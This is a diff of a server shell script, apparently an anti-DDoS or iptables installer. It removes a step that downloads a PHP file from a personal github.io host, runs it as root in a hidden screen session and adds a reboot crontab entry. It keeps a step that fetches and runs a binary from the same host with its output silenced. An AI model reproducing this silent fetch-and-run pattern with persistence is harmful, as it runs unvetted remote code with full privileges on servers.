@@ -212,11 +212,6 @@ clear" > iptables.sh
 
         echo "Scripts are loading."
 
-        curl -L -o antiddos.php https://haker20szs.github.io/haker20szs/antiddos.php 2> /dev/null
-        chmod -R 777 antiddos.php >> /dev/null
-        screen -dmS antiddos php /root/antiddos.php
-        (crontab -l ; echo '@reboot screen -dmS antiddos php /root/antiddos.php') | crontab -
-
         curl -L -o antiddos https://haker20szs.github.io/haker20szs/anti_ddos 2> /dev/null
         chmod -R 777 antiddos >> /dev/null
         ./antiddos >> /dev/null
